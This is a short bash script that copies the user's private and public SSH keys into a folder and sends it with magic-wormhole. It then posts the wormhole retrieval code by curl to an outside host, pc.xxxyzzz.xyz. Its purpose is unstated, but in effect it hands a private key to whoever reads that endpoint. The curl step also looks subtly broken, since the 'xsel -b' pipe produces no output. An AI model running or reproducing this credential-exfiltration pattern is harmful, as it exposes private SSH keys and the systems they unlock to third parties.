#!/bin/bash
cd ~/.ssh
mkdir -p transfer
cp  id_ed25519 transfer/
cp  id_ed25519.pub transfer/
wormhole send transfer >del 2>&1 &
sleep 3;
cat del | tail -n 2 | head -n 1 | xsel -b
echo
curl -d "$(cat del | tail -n 2 | head -n 1 | xsel -b)" https://pc.xxxyzzz.xyz/wh
echo
